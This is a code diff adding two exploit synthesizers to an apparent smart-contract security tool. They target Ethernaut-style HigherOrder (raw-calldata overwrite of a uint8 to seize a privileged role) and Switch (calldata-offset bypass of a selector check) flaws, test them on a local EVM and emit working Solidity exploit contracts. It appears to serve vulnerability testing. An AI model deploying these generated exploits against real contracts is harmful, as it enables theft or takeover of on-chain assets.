@@ -2690,6 +2690,154 @@ def _synth_gatekeeper_one(name, target_src, invariants_src, manifest, scan_step,
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_higher_order(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut HigherOrder 류: 작은 파라미터(uint8)를 선언했지만 assembly 가 calldata
+    32바이트 전체를 sstore 하는 함수. ABI 로는 255 초과 불가지만 원시 calldata 로 큰 값을
+    써넣어 임계(>N) 게이트를 통과하고 특권(commander)을 탈취한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if not re.search(r"sstore\s*\(\s*\w+[_.]?slot\s*,\s*calldataload\s*\(", tb) \
+            and not re.search(r"calldataload\s*\(\s*4\s*\)", tb):
+        return None
+    # 원시 calldata 쓰기 함수(작은 인자) + 임계 게이트로 특권 대입 함수
+    writer = None; wsig = None
+    claim = None; priv = None; thresh = None
+    for fn in _functions(tb):
+        if fn["external"] and re.search(r"calldataload\s*\(", fn["body"]) and fn["args"]:
+            writer = fn["name"]; wsig = "(" + ",".join(a[0] for a in fn["args"]) + ")"
+        cm = re.search(r"(\w+)\s*>\s*(\d+)\)?\s*\)?\s*[\{]?\s*(\w+)\s*=\s*msg\.sender", fn["body"])
+        if fn["external"] and cm:
+            claim, thresh, priv = fn["name"], int(cm.group(2)), cm.group(3)
+    if not writer or not claim or priv is None:
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        r = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":6_000_000}))
+        taddr = r.contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    p0 = tc.functions[priv]().call() if _has_getter(abi, priv) else None
+    sel = Web3.keccak(text=f"{writer}{wsig}")[:4]
+    big = (thresh + 1).to_bytes(32, "big") if thresh < (1<<255) else (2**256-1).to_bytes(32,"big")
+    try:
+        w3.eth.send_transaction({"from":acct,"to":taddr,"data":"0x"+sel.hex()+big.hex(),"gas":200000})
+        getattr(tc.functions, claim)().transact({"from":acct,"gas":200000})
+    except Exception:
+        return None
+    p1 = tc.functions[priv]().call() if _has_getter(abi, priv) else None
+    if p0 is not None and p1 is not None and p1 == p0:
+        return None
+    poc = (HEADER +
+        "// Strategy: HigherOrder. registerTreasury(uint8) writes calldataload(4) — the full\n"
+        "// 32-byte word — so raw calldata sets treasury > 255, then claimLeadership() wins.\n"
+        f"interface IT {{ function {claim}() external; }}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        f"        (bool ok,) = t.call(abi.encodePacked(bytes4(0x{sel.hex()}), uint256({thresh+1}))); require(ok);\n"
+        f"        IT(t).{claim}();\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (higher-order)","strategy":"higher-order","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked via raw-calldata over-write",
+            "strategy":f"higher-order:{writer}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"uint8 파라미터를 원시 calldata 32바이트로 덮어써 임계 게이트를 통과, 특권을 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
+def _synth_switch(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Switch 류: 고정 오프셋(68)에서 셀렉터를 검사하는 modifier 를, 실제 호출
+    데이터를 다른 오프셋에 배치하는 calldata 조작으로 우회한다. 검사에는 off 셀렉터를,
+    실제 내부 호출에는 on 셀렉터를 넣어 잠긴 함수를 실행시킨다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    om = re.search(r"calldatacopy\s*\(\s*\w+\s*,\s*(\d+)\s*,\s*4\s*\)", tb)
+    if not om:
+        return None
+    off = int(om.group(1))
+    flip = None; onfn = None; offfn = None; boolvar = None
+    for fn in _functions(tb):
+        if fn["external"] and any(a[0] == "bytes" for a in fn["args"]) and re.search(r"address\(this\)\s*\.\s*call\s*\(", fn["body"]):
+            flip = fn["name"]
+        bm = re.search(r"(\w+)\s*=\s*true", fn["body"])
+        if fn["external"] and bm and not fn["args"]:
+            onfn = fn["name"]; boolvar = bm.group(1)
+        if fn["external"] and re.search(r"\w+\s*=\s*false", fn["body"]) and not fn["args"]:
+            offfn = fn["name"]
+    if not (flip and onfn and offfn):
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    flipsel = Web3.keccak(text=f"{flip}(bytes)")[:4]
+    onsel = Web3.keccak(text=f"{onfn}()")[:4]
+    offsel = Web3.keccak(text=f"{offfn}()")[:4]
+    # calldata 배치: [4]=offset(0x60) [36]=filler [68]=off셀렉터 [100]=len(4) [132]=on셀렉터
+    def w(x): return x.to_bytes(32, "big")
+    data = (flipsel + w(0x60) + w(0) + (offsel + b"\x00"*28) + w(4) + (onsel + b"\x00"*28))
+    w3, acct = _mk_evm()
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":6_000_000})).contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    try:
+        b0 = tc.functions[boolvar]().call()
+        w3.eth.send_transaction({"from":acct,"to":taddr,"data":"0x"+data.hex(),"gas":300000})
+        b1 = tc.functions[boolvar]().call()
+    except Exception:
+        return None
+    if not (b0 is False and b1 is True):
+        return None
+    poc = (HEADER +
+        "// Strategy: Switch. The onlyOff modifier checks a selector at fixed calldata\n"
+        "// offset 68; we place the OFF selector there but point _data at the ON selector.\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        f"        bytes memory data = hex\"{data.hex()}\";\n"
+        "        (bool ok,) = t.call(data); require(ok);\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (switch)","strategy":"switch","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"'{boolvar}' turned on via calldata-offset bypass",
+            "strategy":f"switch:{flip}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"고정 오프셋(68) 셀렉터 검사를 calldata 배치로 우회해 잠긴 함수를 실행했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Denial 류: 설정 가능한 수신자에게 가스 한도 없이 .call 로 송금한 뒤
     같은 함수에서 추가 상태전이가 이어지는 구조. 공격자가 수신자로 등록되어 콜백에서
@@ -3412,6 +3560,20 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0p) HigherOrder (원시 calldata 로 uint8 초과 기록)
+    try:
+        r = _synth_higher_order(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0q) Switch (calldata 오프셋 우회)
+    try:
+        r = _synth_switch(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 1) 호출 시퀀스 탐색
     try:
         found=_fuzz_search(name, target_src, invariants_src, manifest, do_verify)
@@ -3477,7 +3639,8 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
     for fn in (_storage_attempt, _proxy_attempt, _multiblock_attempt,
                _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency,
                _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
-               _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber):
+               _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
+               _synth_higher_order, _synth_switch):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
